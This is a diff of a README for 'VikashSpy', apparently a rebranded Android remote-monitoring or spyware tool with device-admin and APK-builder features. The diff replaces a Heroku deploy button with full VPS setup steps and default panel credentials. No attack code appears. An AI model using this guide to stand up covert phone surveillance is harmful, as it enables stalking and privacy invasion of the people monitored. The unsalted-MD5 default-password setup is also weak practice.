@@ -20,32 +20,60 @@ A cloud based Android Monitoring Tool, powered by NodeJS
 - Device Admin
 - Built In APK Builder
 
-## Installation on Heroku
-  
-  Video Tutorial for Heroku [Click Here](https://youtu.be/tFt5G19KuLY)
-
-<a href="https://heroku.com/deploy?template=https://github.com/vikashmobileclinic/VikashSpy">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
-</a>
-
 ## Installation on VPS or Server
 
 ## Prerequisites 
  - Java Runtime Environment 9 or above
  - NodeJs 
- - A Server 
+ - A Server  
+ 
+Installation on VPS or Server
+Video Tutorial for VPS or Server Click Here
 
-Setps of Installation [Click Here](https://xploitwizer.com/blog/27/how-to-install-xploitspy-on-vps)
+Connect to your server via SSH
+
+Install JRE 9+
+
+Debian, Ubuntu, Etc
+sudo apt install openjdk-11-jre-headless
+Fedora, Oracle, Red Hat, etc
+sudo yum install java-11-openjdk-devel"
+Windows
+click HERE for downloads
+Install NodeJS Instructions Here (If you can't figure this out, you shouldn't really be using this)
+
+install PM2
+
+sudo npm install pm2 -g
+Clone this repository
+
+git clone https://github.com/vikashmobileclinic/VikashSpy.git
+Now change to the server directory and run these commands
+
+npm install <- install dependencies
+pm2 start index.js <-- start the script
+pm2 startup <- to run VikashSpy on startup
+Default Username : admin & Default Password : password
+
+Change the Username & Password
+
+Stop VikashSPY pm2 stop index
+Open maindb.json in a text editor
+under admin
+set the username as plain text
+set the password as a LOWERCASE MD5 hash
+save the file
+run pm2 restart all
+in your browser navigate to http://<SERVER IP or URL>:22533
  
  Video Tutorial for VPS or Server [Click Here](https://youtu.be/F0K1IXvdEJk)
 
-    
 It's recommended to run VikashSpy behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
 
 ## Buy us a Coffee
-   Bitcoin : 3HwzRLbZxFVxyZzLoEHFnoB5RVKfzwxDbf
+   Bitcoin :  
    
-   Paypal : https://paypal.me/raomk
+   Paypal :  
 
 
 
